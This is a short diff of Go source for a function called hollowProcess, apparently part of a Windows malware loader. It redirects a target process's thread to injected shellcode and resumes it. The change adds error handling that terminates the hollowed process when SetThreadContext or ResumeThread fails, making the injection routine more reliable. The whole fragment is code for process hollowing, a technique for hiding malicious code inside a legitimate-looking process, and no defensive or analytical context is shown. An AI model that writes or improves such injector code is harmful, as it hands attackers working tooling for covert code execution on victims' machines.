@@ -81,8 +81,16 @@ func hollowProcess(targetPath string, shellcode []byte) error {
 	}
 
 	ctx.rip = uint64(addr)
-	procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
-	procResumeThread.Call(hThread)
+	r5, _, _ := procSetThreadContext.Call(hThread, uintptr(unsafe.Pointer(&ctx)))
+	if r5 == 0 {
+		procTerminateProcess.Call(hProc, 1)
+		return fmt.Errorf("SetThreadContext failed; hollowed process terminated")
+	}
+	resumed, _, _ := procResumeThread.Call(hThread)
+	if resumed == ^uintptr(0) {
+		procTerminateProcess.Call(hProc, 1)
+		return fmt.Errorf("ResumeThread failed; hollowed process terminated")
+	}
 
 	return nil
 }
